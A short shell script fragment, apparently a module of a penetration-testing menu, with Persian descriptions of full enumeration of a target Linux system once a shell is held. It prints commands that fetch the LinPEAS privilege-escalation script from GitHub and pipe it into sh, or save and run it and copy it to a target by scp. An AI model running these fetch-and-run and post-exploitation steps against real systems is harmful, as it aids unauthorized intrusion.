DESC="enumeration کامل سیستم لینوکس هدف"
REQ="shell روی هدف"
RISK="LOW"

termux(){ echo "curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh"; }

kali(){
cat <<'EOF'
wget -q https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -O /tmp/lp.sh
chmod +x /tmp/lp.sh && /tmp/lp.sh -a
# انتقال به هدف:
scp /tmp/lp.sh user@<IP>:/tmp/
EOF
}
